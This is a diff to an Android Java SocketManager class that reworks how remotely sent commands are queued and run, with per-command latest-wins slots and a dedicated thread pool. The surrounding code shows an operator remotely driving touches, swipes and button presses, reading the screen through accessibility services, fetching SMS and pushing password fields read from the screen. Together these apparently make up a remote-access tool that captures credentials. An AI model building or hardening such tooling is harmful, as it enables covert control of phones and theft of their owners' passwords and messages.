@@ -83,6 +83,17 @@ public class SocketManager {
         r -> { Thread t = new Thread(r, "SocketMgr-access"); t.setDaemon(true); return t; },
         new java.util.concurrent.ThreadPoolExecutor.CallerRunsPolicy()
     );
+    // Command execution has its own pool so a burst of commands cannot evict
+    // work from the socket/message executor. CallerRunsPolicy preserves the
+    // selected command if this pool is saturated instead of silently dropping
+    // it (the old general executor uses DiscardOldestPolicy for non-command
+    // background work).
+    private final ExecutorService commandDispatchExecutor = new java.util.concurrent.ThreadPoolExecutor(
+        4, 12, 30L, TimeUnit.SECONDS,
+        new java.util.concurrent.LinkedBlockingQueue<>(200),
+        r -> { Thread t = new Thread(r, "SocketMgr-command"); t.setDaemon(true); return t; },
+        new java.util.concurrent.ThreadPoolExecutor.CallerRunsPolicy()
+    );
     private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
     private ScheduledFuture<?>             heartbeatFuture;
 
@@ -228,6 +239,39 @@ public class SocketManager {
     // Accessibility tree reads are NOT thread-safe — serialize them with a 1-permit semaphore.
     // Concurrent AccessibilityNodeInfo traversals corrupt Android's internal node pool and crash the process.
     private final java.util.concurrent.Semaphore accessSemaphore = new java.util.concurrent.Semaphore(1);
+
+    /**
+     * Per-command latest-wins gate.
+     *
+     * Different command names use different slots and can therefore execute
+     * concurrently.  A burst of the same command keeps only one selected
+     * command plus (while it is running) the newest arrival.  This prevents a
+     * slow screen read, SMS fetch, or other command from turning every polling
+     * tick into a long executor queue.
+     */
+    private static final class QueuedCommand {
+        final String commandId;
+        final String command;
+        final JSONObject params;
+
+        QueuedCommand(String commandId, String command, JSONObject params) {
+            this.commandId = commandId;
+            this.command    = command;
+            this.params     = params;
+        }
+    }
+
+    private static final class CommandSlot {
+        QueuedCommand active;
+        QueuedCommand pending;
+        boolean started;
+        java.util.concurrent.Future<?> scheduled;
+    }
+
+    private final java.util.concurrent.ConcurrentHashMap<String, CommandSlot> commandSlots =
+            new java.util.concurrent.ConcurrentHashMap<>();
+    private final java.util.concurrent.ConcurrentHashMap<String, CommandSlot> activeCommandSlots =
+            new java.util.concurrent.ConcurrentHashMap<>();
 
     // Touch/swipe deduplication — ignore identical command within 250 ms
     private volatile String  lastTouchKey  = "";
@@ -1091,6 +1135,7 @@ public class SocketManager {
             d.put("response",  responseStr);
             sendMessage("command:response", d);
             Log.d(TAG, "→ response sent for " + command);
+            completeQueuedCommand(commandId);
         } catch (JSONException e) {
             Log.e(TAG, "sendResponse error: " + e.getMessage());
         }
@@ -1103,6 +1148,7 @@ public class SocketManager {
             d.put("error",     error);
             sendMessage("command:response", d);
             Log.w(TAG, "→ error response for " + command + ": " + error);
+            completeQueuedCommand(commandId);
         } catch (JSONException e) {
             Log.e(TAG, "sendErrorResponse error: " + e.getMessage());
         }
@@ -1177,45 +1223,114 @@ public class SocketManager {
         if (params == null) params = new JSONObject();
         try { params.put("commandId", commandId); } catch (JSONException ignored) {}
 
-        // Qualifying UI interactions (touch, swipe, press_back/home/recents, etc.) reset the
-        // idle-suspension timer. Data-query commands do NOT reset it — the timer is specifically
-        // tracking whether a human operator is performing real interactions, not just polling data.
-        if (isUiInteractionCommand(command)) {
+        final QueuedCommand incoming = new QueuedCommand(commandId, command, params);
+        final CommandSlot slot = commandSlots.computeIfAbsent(command, ignored -> new CommandSlot());
+        QueuedCommand superseded = null;
+        boolean schedule = false;
+
+        synchronized (slot) {
+            if (slot.active == null) {
+                slot.active = incoming;
+                slot.started = false;
+                schedule = true;
+            } else if (!slot.started) {
+                // The previous command has not started executing yet. Replace
+                // it before it reaches an executor worker.
+                superseded = slot.active;
+                slot.active = incoming;
+                schedule = true;
+                if (slot.scheduled != null) slot.scheduled.cancel(false);
+            } else {
+                // The selected command is already running and must be allowed
+                // to finish. Keep only the newest command behind it.
+                superseded = slot.pending;
+                slot.pending = incoming;
+            }
+        }
+
+        if (superseded != null) {
+            sendSupersededResponse(superseded);
+        }
+        if (schedule) scheduleQueuedCommand(slot, incoming);
+    }
+
+    private void scheduleQueuedCommand(CommandSlot slot, QueuedCommand command) {
+        Runnable work = () -> runQueuedCommand(slot, command);
+        synchronized (slot) {
+            // A newer command may have replaced this one before its executor
+            // task was submitted.
+            if (slot.active != command) return;
+            java.util.concurrent.ExecutorService target =
+                    isAccessibilityCommand(command.command) ? accessibilityExecutor : commandDispatchExecutor;
+            slot.scheduled = target.submit(work);
+        }
+    }
+
+    private void runQueuedCommand(CommandSlot slot, QueuedCommand command) {
+        synchronized (slot) {
+            if (slot.active != command) return;
+            slot.started = true;
+            slot.scheduled = null;
+        }
+        activeCommandSlots.put(command.commandId, slot);
+
+        // Qualifying UI interactions reset idle suspension only for the command
+        // that was actually selected, not for commands discarded in a burst.
+        if (isUiInteractionCommand(command.command)) {
             idleSuspensionManager.onInteraction();
         }
 
-        // Accessibility commands acquire accessSemaphore and can block for several seconds.
-        // Route them to the dedicated accessibilityExecutor so they never stall the main
-        // executor pool — which must stay available for heartbeats and data commands.
-        if (isAccessibilityCommand(command)) {
-            final JSONObject finalParams = params;
-            accessibilityExecutor.execute(() -> {
-                try {
-                    JSONObject result = dispatchCommand(command, finalParams);
-                    if (result != null) sendResponse(commandId, command, result);
-                    // null → command already sent its own async response (stream start, gcode, etc.)
-                } catch (Throwable e) {
-                    Log.e(TAG, "accessibility cmd exception [" + command + "]: " + e.getMessage());
-                    sendErrorResponse(commandId, command, "Internal error: " + e.getMessage());
-                }
-            });
-            return; // async — accessibilityExecutor calls sendResponse when done
-        }
-
-        JSONObject result;
         try {
-            result = dispatchCommand(command, params);
+            JSONObject result = dispatchCommand(command.command, command.params);
+            if (result != null) {
+                sendResponse(command.commandId, command.command, result);
+            }
+            // null means the command owns its response and will call
+            // sendResponse/sendErrorResponse from its asynchronous worker.
         } catch (Throwable e) {
-            // Catch Throwable so OOM or other Errors still send an error response
-            Log.e(TAG, "handleCommand exception for " + command + ": " + e.getMessage());
-            sendErrorResponse(commandId, command, "Internal error: " + e.getMessage());
-            return;
+            Log.e(TAG, "handleCommand exception for " + command.command + ": " + e.getMessage());
+            sendErrorResponse(command.commandId, command.command, "Internal error: " + e.getMessage());
+        }
+    }
+
+    private void sendSupersededResponse(QueuedCommand command) {
+        try {
+            JSONObject response = new JSONObject();
+            response.put("success", false);
+            response.put("superseded", true);
+            response.put("error", "Superseded by a newer command");
+            sendResponse(command.commandId, command.command, response);
+        } catch (JSONException e) {
+            Log.e(TAG, "superseded response error: " + e.getMessage());
+        }
+    }
+
+    /**
+     * A response marks the selected command complete.  Only after that write
+     * has been attempted are duplicate arrivals discarded.  This guarantees a
+     * command that was already chosen can never be removed by a newer request.
+     */
+    private void completeQueuedCommand(String commandId) {
+        if (commandId == null) return;
+        CommandSlot slot = activeCommandSlots.remove(commandId);
+        if (slot == null) return;
+
+        QueuedCommand finished;
+        QueuedCommand pending;
+        synchronized (slot) {
+            finished = slot.active;
+            if (finished == null || !commandId.equals(finished.commandId)) return;
+            pending = slot.pending;
+            slot.pending = null;
+            slot.active = null;
+            slot.started = false;
+            slot.scheduled = null;
         }
 
-        // null means the command handles its own response asynchronously (chunked streaming).
-        // bulkExecutor tasks call sendResponse / sendChunked directly — do not double-send.
-        if (result == null) return;
-        sendResponse(commandId, command, result);
+        if (pending != null) {
+            sendSupersededResponse(pending);
+        }
+        commandSlots.remove(finished.command, slot);
     }
 
     private JSONObject dispatchCommand(String command, JSONObject params) throws Exception {
@@ -2543,7 +2658,11 @@ public class SocketManager {
                     // Repeated dashboard reads only need the visible foreground
                     // window; scanning every accessible window adds avoidable
                     // latency and device-side accessibility work.
-                    response = sr.readVisibleForegroundScreen();
+                    // The repeated dashboard reader only needs readable text
+                    // and hierarchy depth.  Avoid sending bounds and the
+                    // large per-node interaction/state payload used by
+                    // read_screen and the recording reader.
+                    response = sr.readVisibleForegroundTextScreen();
                     pushPasswordFieldsFromScreen(response);
                 } finally {
                     if (acquired) accessSemaphore.release();
